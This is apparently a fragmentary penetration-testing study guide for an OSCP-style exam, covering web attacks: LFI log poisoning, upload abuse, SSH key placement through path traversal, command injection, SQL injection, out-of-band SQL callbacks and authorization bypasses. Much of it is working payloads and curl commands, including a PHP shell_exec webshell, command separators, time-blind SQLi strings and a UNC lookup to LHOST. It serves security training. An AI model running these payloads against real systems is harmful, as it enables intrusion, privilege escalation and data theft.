title: 2.2.7.1 Purpose and result
text: id="1-purpose-and-result-2">2.2.7.1 Purpose and result Verified command execution under the inclusion process identity. <h3

title: 2.2.7.2 Recognition clues
text: id="2-recognition-clues-2">2.2.7.2 Recognition clues A confirmed evaluating include and a log or file containing attacker-controlled bytes. <h4

title: 2.2.7.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-2">2.2.7.2.1 Find the clue from your starting access Where to investigate: After a file/include primitive is demonstrated, use readable configuration to locate the actual log and check whether your harmless request marker is present. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: Controlled content survives logging; inclusion identity can read it; interpreter evaluates it; requested command facility is available Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Require command-specific output distinct from the logged payload and record hostname/identity. Failure/next check: Missing log access, escaping or plain-text reading breaks this chain. Data/RFI variants are viable only when their explicitly listed wrapper/configuration and return-route conditions hold. curl -sk -A 'LOG_CANARY' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/PATH/TO/access.log' http://TARGET:PORT/index.php Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Readable log excerpt: GET / ... User-Agent=LOG_CANARY Recognize this detail: The include/read identity can reach a log containing your controlled input; evaluation and payload preservation still need proof. Still missing before method selection: Separate raw file read from interpreter evaluation, confirm exact file path and encoding, then a minimal command effect. Outcome after checking Example and next decision Enabled after validation Controlled log bytes are evaluated and the bounded identity proof succeeds: use the inclusion-execution chain. Ruled out in this context The log is only served as inert text: rule out execution through this reader while retaining file disclosure. Inconclusive No marker may mean a different log, buffered writes or escaped content; inspect configuration before changing payloads. If you do not yet have this clue: start with Disclose PHP source through an inclusion wrapper . <h3

title: 2.2.7.3 Prerequisites
text: id="3-prerequisites-2">2.2.7.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: Controlled content survives logging; inclusion identity can read it; interpreter evaluates it; requested command facility is available. <h3

title: 2.2.7.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-2">2.2.7.4 Discover and verify prerequisites curl -skG --data-urlencode 'page=/var/log/apache2/access.log' http://TARGET:PORT/index.php <h3

title: 2.2.7.5 Why it works
text: id="5-why-it-works-2">2.2.7.5 Why it works LFI alone selects a local file. Execution requires that included bytes be interpreted as code; source displayed as text proves a weaker primitive. Data-wrapper and remote-include variants below have additional URL-inclusion and routing prerequisites. <h3

title: 2.2.7.6 Execute and choose variants
text: id="6-execute-and-choose-variants-2">2.2.7.6 Execute and choose variants curl -sk -A '<?php echo shell_exec($_GET["cmd"]); ?>' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php Prerequisites: the controlled header is logged, the web identity can read the exact log, the inclusion sink evaluates PHP and the payload survives encoding. On Windows/XAMPP, investigate application-specific paths such as C:\xampp\apache\logs\access.log . Decisive output: the unique command output and target execution identity. If code appears as text, only read/inclusion is proven. <summary

title: 2.2.7.6.1 Variant — PHP data wrapper
text: id="variant-2-2-7-6-1">2.2.7.6.1 Variant — PHP data wrapper PAYLOAD=$(printf '%s' '<?php echo shell_exec($_GET["cmd"]); ?>' | base64 -w0) curl -skG --data-urlencode "page=data://text/plain;base64,$PAYLOAD" --data-urlencode 'cmd=id' http://TARGET:PORT/index.php Requires URL inclusion in the sink and PHP allow_url_include=On ; it is disabled by default in current PHP configurations. <summary

title: 2.2.7.6.2 Variant — remote file inclusion

Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: A valid upload request and permitted account; the server accepts and stores controlled bytes Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Confirm saved/retrieved bytes and the final identifier/path; a success message alone is insufficient. Failure/next check: A rejected extension may be client validation, server MIME/content policy or role permission. Preserve a valid benign baseline before changing one property. printf '%s\n' 'UPLOAD_CANARY' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;type=text/plain' http://TARGET:PORT/upload Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. HTTP/1.1 201 Created {"id":"UPLOAD_ID","url":"/files/UPLOAD_ID"} Recognize this detail: The real upload route, field and response identify a storage/retrieval candidate. Still missing before method selection: Retrieve the canary independently; establish stored bytes, final name and account/context before testing execution. Outcome after checking Example and next decision Enabled after validation The canary is stored and retrievable: a write/retrieval primitive is verified. Ruled out in this context The server only validates and discards the upload: reject the assumed persistent-write capability. Inconclusive A success message without a retrieval/path observation leaves persistence unknown. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

title: 2.2.9.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-4">2.2.9.2.1 Find the clue from your starting access Where to investigate: Begin with a verified retrievable upload; inspect final naming, response handling and evidence of the application's actual interpreter. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: Controlled executable content survives validation; final storage/URL is handled by the compatible interpreter; process execution is permitted Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Require target command output and identity; acceptance, source download and a 200 status are weaker results. Failure/next check: Check extension mapping, server rename, handler location and content transformation. Do not treat every upload-filter bypass as a shell. curl -sk -i http://TARGET:PORT/uploads/FILE Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Stored file response: Content-Type: text/plain Body: literal uploaded script source Recognize this detail: A retrievable script may be inert. The interesting detail is how the final location is handled, not acceptance of a script extension. Still missing before method selection: Retrieve the exact stored upload and request it through the candidate server-side handler. Verify an attributable identity marker from that request; uploaded bytes or a 200 response alone do not prove execution. Outcome after checking Example and next decision Enabled after validation The correct final handler executes the minimal proof as the web identity: choose upload-to-execution. Ruled out in this context The file consistently downloads/displays as source in non-executable storage: rule out execution at this location. Inconclusive Unknown server rename or storage URL leaves handler selection unresolved. If you do not yet have this clue: start with Establish upload acceptance, storage and retrieval . <h3

title: 2.2.10.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-5">2.2.10.2.1 Find the clue from your starting access Where to investigate: Inspect an accepted upload's raw multipart filename/path fields and compare the returned destination for one harmless unique filename. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: Destination path control survives normalization; write identity can reach the destination; a known consumer accepts the resulting file Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Independently prove destination and bytes before claiming a privileged consumer or accepted key. Failure/next check: Normalization, permissions and consumer policy are separate failure points; preserve the proven write without overstating its effect. curl -sk -b cookies.txt -F 'file=@probe.txt;filename=../UNIQUE_CANARY.txt;type=text/plain' http://TARGET:PORT/upload Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Submitted filename: ../UNIQUE_CANARY.txt Independent listing: /EXPECTED_PARENT/UNIQUE_CANARY.txt Recognize this detail: An independently located out-of-directory canary is path-control evidence; it does not establish access to another user's key directory. Still missing before method selection: Confirm filesystem identity, exact destination semantics, write permissions and a useful consumer/trigger. Outcome after checking Example and next decision Enabled after validation A controlled usable destination and its consumer accept the file: select that verified write-to-access chain. Ruled out in this context The server strips path components and stores only a generated basename: reject arbitrary placement in that context. Inconclusive A reflected submitted path without independent location evidence leaves placement inconclusive. If you do not yet have this clue: start with Establish upload acceptance, storage and retrieval . <h3

title: 2.2.10.5 Why it works
text: id="5-why-it-works-5">2.2.10.5 Why it works Arbitrary placement is different from an executable web upload. An SSH-key route additionally requires the exact user/home, directory/file semantics, accepted key policy and reachable SSH service. <h3

title: 2.2.10.6 Execute and choose variants
text: id="6-execute-and-choose-variants-5">2.2.10.6 Execute and choose variants First use a harmless unique filename outside the normal upload directory and verify it through a separate read/listing primitive. Do not overwrite an existing file as a detection test. <summary

title: 2.2.10.6.1 Lab-only variant — controlled SSH public-key placement
text: id="variant-2-2-10-6-1">2.2.10.6.1 Lab-only variant — controlled SSH public-key placement ssh-keygen -t ed25519 -f ./web_upload_key -N '' cp ./web_upload_key.pub ./authorized_keys curl -sk -b cookies.txt -F 'file=@authorized_keys;filename=../../../../home/USER/.ssh/authorized_keys' http://TARGET:PORT/upload ssh -i ./web_upload_key -p SSH_PORT USER@TARGET Use only in a disposable authorized lab after confirming the exact user/home, SSH service, web write identity, destination semantics and overwrite impact. Failure can mean path normalization, permission denial, SSH policy or a different user—not necessarily that upload path control is absent. <h3

Illustrative output: the destination belongs to the web identity but another user's SSH directory is not writable. Interpretation: path control exists; the proposed key-placement chain does not. <h3

title: 2.2.11 Prove visible or blind operating-system command injection
text: id="prove-visible-or-blind-operating-system-command-injection">2.2.11 Prove visible or blind operating-system command injection Blocks: 4. Operational procedure | Quick sheet <h3

title: 2.2.11.1 Purpose and result
text: id="1-purpose-and-result-6">2.2.11.1 Purpose and result Verified command execution or a repeatable command-dependent blind effect. <h3

title: 2.2.11.2 Recognition clues
text: id="2-recognition-clues-6">2.2.11.2 Recognition clues An input appears in a command-like operation or causes shell-dependent behavior. <h4

title: 2.2.11.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-6">2.2.11.2.1 Find the clue from your starting access Where to investigate: Find a mapped feature that runs a system-like operation, inspect its request, and compare a normal value with one bounded command-dependent probe. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: Input reaches command execution with an exploitable parsing boundary; process identity/runtime can perform the selected proof Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Use reproducible command-specific output or controlled timing comparisons; a server error alone does not prove execution. Failure/next check: A callback failure does not disprove already-confirmed execution. Diagnose quoting/interpreter/route at the relevant layer. curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Normal function: network diagnostic Request parameter: host=NORMAL_VALUE Response includes utility-style output Recognize this detail: The function and output suggest an OS utility consumer; the parameter's parsing boundary is the candidate. Still missing before method selection: Replay the real request with a benign id/whoami marker and a normal control. Require attributable command output, or repeat bounded timing/control tests for a blind sink. Reflected text or one slow response is not execution. Outcome after checking Example and next decision Enabled after validation Only the injected request yields the intended command-derived proof: select command injection. Ruled out in this context The input is passed as a fixed safe argument and metacharacters remain literal: reject that separator/context route. Inconclusive A generic error or isolated delay could be application/load behavior; run stable controls before deciding. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

text: id="5-why-it-works-6">2.2.11.5 Why it works The request decoder, application language and shell parse at different layers. Visible output and controlled timing can prove execution without a reverse connection. <h3

title: 2.2.11.6 Execute and choose variants
text: id="6-execute-and-choose-variants-6">2.2.11.6 Execute and choose variants <h5

title: 2.2.11.6.1.1 Visible-output baseline
text: id="visible-output-baseline">2.2.11.6.1.1 Visible-output baseline Start with a benign identity marker appropriate to the inferred operating system: curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH Decisive output: command output attributable to the target, such as a username/UID that is absent from the normal response. Reflection of the payload is not execution. <summary

title: 2.2.11.6.1.1.1 Variants — separators, quoting and POST bodies
text: id="variant-2-2-11-6-1-1-1">2.2.11.6.1.1.1 Variants — separators, quoting and POST bodies Test only the forms compatible with the observed command and platform: 127.0.0.1; id 127.0.0.1 && id 127.0.0.1 | id 127.0.0.1%0aid curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -sk -X POST -H 'Content-Type: application/json' -d '{"host":"127.0.0.1;id"}' http://TARGET:PORT/api/PATH For Windows command contexts, use an observed cmd.exe or PowerShell boundary before choosing syntax: 127.0.0.1 & whoami 127.0.0.1 | whoami <h5

title: 2.2.11.6.1.2 Blind timing proof
text: id="blind-timing-proof">2.2.11.6.1.2 Blind timing proof Repeat a control and a bounded-delay request several times: curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH Windows candidate after platform evidence: 127.0.0.1 & timeout /t 5 Decisive output: a repeatable delay near the chosen interval relative to multiple controls. One slow response is inconclusive. <h5

title: 2.2.11.6.1.3 After command execution
text: id="after-command-execution">2.2.11.6.1.3 After command execution Linux: id; hostname; pwd Windows: whoami; hostname; cd Record the execution identity, working directory, shell/parser and egress assumptions. Hand reliable-session work to Block 7; do not treat one command response as an interactive shell. <h3

title: 2.2.12.2 Recognition clues
text: id="2-recognition-clues-7">2.2.12.2 Recognition clues Database errors or controlled true/false response differences. <h4

title: 2.2.12.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-7">2.2.12.2.1 Find the clue from your starting access Where to investigate: Map a data lookup/login/search request, preserve its session and compare one changed input with normal/invalid controls. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: Input reaches a SQL query; a valid request and stable response baseline exist Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Require repeatable, query-dependent behavior and preserve request/session controls; identify DBMS evidence before DB-specific payloads. Failure/next check: Generic errors, WAF responses, caching and broken sessions can imitate SQLi. title: 2.2.12.6.1.1 Establish query influence
text: id="1-establish-query-influence">2.2.12.6.1.1 Establish query influence Replay a valid request in Burp Repeater. Change one parameter and compare a normal value, quote, true condition and false condition: VALUE VALUE' VALUE' AND '1'='1 VALUE' AND '1'='2 For a numeric context: 1 1 AND 1=1 1 AND 1=2 Evidence: a database error, stable true/false response difference, or repeatable database-specific delay. title: 2.2.12.6.1.3 Determine UNION shape
text: id="3-determine-union-shape">2.2.12.6.1.3 Determine UNION shape First establish column count: ' ORDER BY 1-- - ' ORDER BY 2-- - ' ORDER BY 3-- - Or increment NULL columns until the query succeeds: ' UNION SELECT NULL-- - ' UNION SELECT NULL,NULL-- - ' UNION SELECT NULL,NULL,NULL-- - Then find a displayed text-compatible column: ' UNION SELECT NULL,'MARKER_7F31',NULL-- - Decisive output: the marker appears in a response location controlled by the injected row. Match the exact column count and data types. <h5

Keep each extraction request reproducible in Repeater. <h5

text: id="5-boolean--or-time-blind-extraction">2.2.12.6.1.5 Boolean- or time-blind extraction Choose a stable page marker or content length for true/false comparisons: ' AND SUBSTRING((SELECT version()),1,1)='P'-- - ' AND SUBSTRING((SELECT version()),1,1)='X'-- - DBMS-specific time proofs: MySQL: ' AND IF(1=1,SLEEP(5),0)-- - PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'-- Repeat controls. title: 2.2.17 Conditional: validate an out-of-band SQL request channel
text: id="conditional-validate-an-out-of-band-sql-request-channel">2.2.17 Conditional: validate an out-of-band SQL request channel Blocks: 4. Operational procedure | Quick sheet <h3

title: 2.2.17.1 Purpose and result
text: id="1-purpose-and-result-12">2.2.17.1 Purpose and result A verified SQL-dependent outbound request, with its data and transport limits established. <h3

title: 2.2.17.2 Recognition clues
text: id="2-recognition-clues-12">2.2.17.2 Recognition clues SQL execution is plausible but in-band output is unavailable. <h4

title: 2.2.17.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-12">2.2.17.2.1 Find the clue from your starting access Where to investigate: After DBMS/query influence is established, document the absence of stable in-band channels and inspect whether the database platform exposes a permitted outbound lookup facility. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: A DBMS/function capable of the selected outbound lookup, sufficient database/OS rights, allowed egress and a uniquely identifiable controlled receiver Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Correlate the query and unique receiver event; do not claim arbitrary database extraction from one callback. Failure/next check: Function restrictions, platform behavior, privileges or blocked outbound transport can defeat the route. Use a stable in-band or blind method when available. curl -sk -D - --get --data-urlencode 'PARAM=BASELINE_VALUE' http://TARGET:PORT/PATH Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Saved query context: DBMS identified Response: no rendered rows; unstable timing Outbound database capability: unknown Recognize this detail: Lack of an in-band channel motivates investigation but does not prove an outbound channel exists. Still missing before method selection: Confirm the exact function, database/OS rights, allowed egress and a uniquely correlated controlled receiver event. Outcome after checking Example and next decision Enabled after validation The query generates only the expected controlled event: select the bounded outbound channel. Ruled out in this context The required function or outbound permission is unavailable: discard this OOB mechanism. Inconclusive No callback leaves query execution and egress unresolved; use another stable channel if available. If you do not yet have this clue: start with Establish SQL query influence and DBMS context . <h3

title: 2.2.17.3 Prerequisites
text: id="3-prerequisites-12">2.2.17.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: A DBMS/function capable of the selected outbound lookup, sufficient database/OS rights, allowed egress and a uniquely identifiable controlled receiver. <h3

title: 2.2.17.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-12">2.2.17.4 Discover and verify prerequisites ss -lnt ip route get TARGET <h3

title: 2.2.17.5 Why it works
text: id="5-why-it-works-12">2.2.17.5 Why it works Out-of-band SQL effects require database execution and a second network path. A received request must be tied to the selected query; a missing callback cannot distinguish blocked egress from failed SQL. <h3

title: 2.2.17.6 Execute and choose variants
text: id="6-execute-and-choose-variants-12">2.2.17.6 Execute and choose variants Out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. A callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction. Hypothetical MySQL/Windows UNC lookup in an authorized lab: SELECT LOAD_FILE(CONCAT('\\\\LHOST\\', DATABASE())); Use a uniquely labelled controlled listener/domain and transmit no sensitive row data during proof. Required conditions include a DBMS/function that performs the lookup, sufficient database/OS permissions, working outbound DNS/SMB/HTTP as applicable and an observable callback. No callback is inconclusive until query execution and outbound reachability are separated. Avoid poisoning/spoofing; the current OSCP+ exam guide prohibits spoofing. <h3

title: 2.2.17.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-12">2.2.17.7 Worked example — hypothetical Observation: an injected request has no visible result. Test: use the documented controlled lookup with a unique label and no sensitive row data. Illustrative output: only that query produces the expected lookup. Interpretation: the channel exists; evaluate permissions and scope before any further use. <h3

title: 2.2.17.8 Verify the result
text: id="8-verify-the-result-12">2.2.17.8 Verify the result Correlate the query and unique receiver event; do not claim arbitrary database extraction from one callback. <h3

title: 2.2.17.9 Failure and fallback
text: id="9-failure-and-fallback-12">2.2.17.9 Failure and fallback Function restrictions, platform behavior, privileges or blocked outbound transport can defeat the route. Use a stable in-band or blind method when available. <h3

title: 2.2.18 Cross an object-ownership boundary
text: id="cross-an-object-ownership-boundary">2.2.18 Cross an object-ownership boundary Blocks: 4. Operational procedure | Quick sheet <h3

text: id="1-purpose-and-result-13">2.2.18.1 Purpose and result Verified unauthorized object read or modification. <h3

title: 2.2.18.2 Recognition clues
text: id="2-recognition-clues-13">2.2.18.2 Recognition clues A request selects an object by ID/path and two authorized ownership contexts are available. <h4

title: 2.2.18.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-13">2.2.18.2.1 Find the clue from your starting access Where to investigate: Capture object requests for two authorized study accounts and associate each object ID with its owner before making a cross-account comparison. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: The server accepts a lower-privilege identity's request for an object it should not access Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Verify object ownership, requesting identity and the actual unauthorized effect. Failure/next check: A 200 response may be a generic page or public object. Validate ownership and intended access before drawing a conclusion. curl -sk -b lower-role.cookies http://TARGET:PORT/api/objects/OBJECT_ID Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Request identity: USER_A Object metadata: owner=USER_B Response: private object bytes Recognize this detail: A private object owned by another controlled account is returned to the lower-context requester. Still missing before method selection: Confirm intended sharing rules, account isolation and actual object content/change with valid controls. Outcome after checking Example and next decision Enabled after validation The action crosses a real ownership boundary: use the demonstrated read/write primitive. Ruled out in this context The object is intentionally public/shared: reject unauthorized-access inference from its ID alone. Inconclusive Unknown ownership or identical generic pages leave the access claim unproved. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

title: 2.2.18.3 Prerequisites
text: id="3-prerequisites-13">2.2.18.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: The server accepts a lower-privilege identity's request for an object it should not access. <h3

title: 2.2.18.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-13">2.2.18.4 Discover and verify prerequisites curl -sk -b lower-role.cookies http://TARGET:PORT/api/objects/OBJECT_ID <h3

title: 2.2.18.5 Why it works
text: id="5-why-it-works-13">2.2.18.5 Why it works Knowing or guessing an identifier is not the flaw; missing server-side authorization on the selected object is. Public objects and intentionally shared data need different expected behavior. <h3

title: 2.2.18.6 Execute and choose variants
text: id="6-execute-and-choose-variants-13">2.2.18.6 Execute and choose variants Use two controlled lab identities and one object owned by each: GET /api/orders/OBJECT_B HTTP/1.1 Host: DOMAIN Authorization: Bearer USER_A_TOKEN Save user A's successful request for object A. Change only the path/query/body object reference to object B. Keep A's token . Verify disclosure or the intended update/delete effect against B's object. Decisive output: data or a state change belonging to B under A's context. A different error or 200 wrapper is not enough. <h3

title: 2.2.18.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-13">2.2.18.7 Worked example — hypothetical Observation: account A can request account B's object ID. Test: compare owner, lower-role and unauthenticated controls. Illustrative output: A receives B's private document. Interpretation: object-level read is confirmed; inspect the document's useful artifacts. <h3

text: id="cross-role-function-or-session-authorization-boundaries">2.2.19 Cross role, function or session authorization boundaries Blocks: 4. Operational procedure | Quick sheet <h3

text: id="1-purpose-and-result-14">2.2.19.1 Purpose and result A verified application privilege/action transition. <h3

text: id="2-recognition-clues-14">2.2.19.2 Recognition clues Administrative actions/routes or request methods visible from a lower role. <h4

title: 2.2.19.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-14">2.2.19.2.1 Find the clue from your starting access Where to investigate: Compare ordinary-user and authorized-administrator requests for a real protected function, preserving method, CSRF/session and arguments. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: The lower-role identity can invoke a protected server-side action without its required authorization Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Prove the protected effect and requesting identity; a rendered administrative page without action rights is a weaker finding. Failure/next check: Expired cookies, CSRF checks and wrong methods are request-state failures; preserve the valid baseline before assessing authorization. curl -sk -i -b lower-role.cookies http://TARGET:PORT/ADMIN_PATH Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Lower-role request: protected management form visible Protected action result: not yet tested Recognize this detail: A visible administrative route is a lead; only a server-side protected effect establishes the missing role check. Still missing before method selection: Replay a valid authorized action under the lower context and independently inspect its permitted effect. Outcome after checking Example and next decision Enabled after validation The lower context performs the protected action: select the function/role authorization method. Ruled out in this context Only the form is visible and every protected action is correctly denied: reject action-level compromise. Inconclusive CSRF/session failure prevents assessing authorization; repair the normal request first. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

title: 2.2.19.3 Prerequisites
text: id="3-prerequisites-14">2.2.19.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: The lower-role identity can invoke a protected server-side action without its required authorization. <h3

title: 2.2.19.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-14">2.2.19.4 Discover and verify prerequisites curl -sk -i -b lower-role.cookies http://TARGET:PORT/ADMIN_PATH <h3

title: 2.2.19.5 Why it works
text: id="5-why-it-works-14">2.2.19.5 Why it works Hiding a button is presentation control. Authorization must be enforced on the server for the exact route/method/action; authentication alone does not grant that action. <h3

title: 2.2.19.6 Execute and choose variants
text: id="6-execute-and-choose-variants-14">2.2.19.6 Execute and choose variants Replay the same operation as: anonymous -> ordinary user -> alternate ordinary user -> administrator Compare UI and API paths, then test the legitimate method variants suggested by captured traffic or documentation. curl -ski -b user-a.cookies http://TARGET:PORT/admin/PATH curl -ski -X POST -b user-a.cookies -H 'Content-Type: application/json' -d '{"action":"EXPECTED_ACTION"}' http://TARGET:PORT/api/admin/PATH Failure cue: a route name containing admin does not establish a bypass. Verify a privileged read or action under the lower-privileged identity. <h3

title: 2.2.19.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-14">2.2.19.7 Worked example — hypothetical Observation: a low-role account knows an administrative endpoint. Test: replay the authorized action with that account's valid session. Illustrative output: an independent read confirms the protected change. Interpretation: function authorization is missing. <h3

text: id="1-purpose-and-result-15">2.2.20.1 Purpose and result A verified unauthorized property or role change. <h3

title: 2.2.20.2 Recognition clues
text: id="2-recognition-clues-15">2.2.20.2 Recognition clues API objects expose role, ownership or security-sensitive properties. <h4

title: 2.2.20.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-15">2.2.20.2.1 Find the clue from your starting access Where to investigate: Read a legitimate API profile and inspect its schema/update request for security-sensitive properties not exposed by the user interface. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: The server binds an untrusted property to a persistent security-relevant field without checking permission Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Independently reread the object and demonstrate the resulting permitted action under the same account. Failure/next check: Ignored/filtered fields disprove that specific assignment route; investigate another property or function boundary. curl -sk -b cookies.txt http://TARGET:PORT/api/PROFILE_PATH Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. {"displayName":"VALUE","ownerId":"USER_ID","role":"user"} Recognize this detail: Returned owner/role fields identify properties to investigate; they are not evidence that the server binds them on update. Still missing before method selection: Check accepted writable fields, independent persistence and a resulting permission change. Outcome after checking Example and next decision Enabled after validation A lower user changes the protected property and gains the verified action: select mass assignment. Ruled out in this context The sensitive field is ignored or authorization state remains unchanged: reject that property route. Inconclusive The response merely echoes submitted JSON: reread state before drawing a conclusion. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

title: 2.2.20.3 Prerequisites
text: id="3-prerequisites-15">2.2.20.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: The server binds an untrusted property to a persistent security-relevant field without checking permission. <h3

title: 2.2.20.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-15">2.2.20.4 Discover and verify prerequisites curl -sk -b cookies.txt http://TARGET:PORT/api/PROFILE_PATH <h3

title: 2.2.20.5 Why it works
text: id="5-why-it-works-15">2.2.20.5 Why it works Returning a property does not make it writable. The change must persist and affect authorization; echoing a submitted JSON field is not sufficient. <h3

title: 2.2.20.6 Execute and choose variants
text: id="6-execute-and-choose-variants-15">2.2.20.6 Execute and choose variants Start with a valid captured registration/update request and add one server-owned property: curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD","role":"administrator"}' http://TARGET:PORT/api/v1/register Decisive output: authenticate as the new/updated identity and perform an administrator-only action. An echoed or stored role field may be ignored by authorization logic. <summary

title: 2.2.20.6.1 Variant — method mismatch reveals a valid route
text: id="variant-2-2-20-6-1">2.2.20.6.1 Variant — method mismatch reveals a valid route curl -ski http://TARGET:PORT/api/v1/users/USER/password curl -ski -X OPTIONS http://TARGET:PORT/api/v1/users/USER/password curl -ski -X PUT -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"password":"NEW_PASSWORD"}' http://TARGET:PORT/api/v1/users/USER/password Use PUT/PATCH only when a 405 , Allow header, documentation or JavaScript behavior supports it. Verify the new credential through a separate login. <h3

text: id="7-worked-example--hypothetical-15">2.2.20.7 Worked example — hypothetical Observation: a profile contains a role field. Test: submit one controlled field change using the valid update request. Illustrative output: a separate authenticated request confirms the elevated action. Interpretation: the writable property enabled a privilege transition. <h3

title: 2.2.21 Execute browser code and validate a useful same-origin action
text: id="execute-browser-code-and-validate-a-useful-same-origin-action">2.2.21 Execute browser code and validate a useful same-origin action Blocks: 4. Operational procedure | Operational procedure | Quick sheet <h3

title: 2.2.21.1 Purpose and result
text: id="1-purpose-and-result-16">2.2.21.1 Purpose and result Verified browser-context execution and, when enabled, an application privilege/action transition. <h3

title: 2.2.21.2 Recognition clues
text: id="2-recognition-clues-16">2.2.21.2 Recognition clues Untrusted input reaches an executable HTML/JavaScript context. <h4

title: 2.2.21.2.1 Find the clue from your starting access
text:
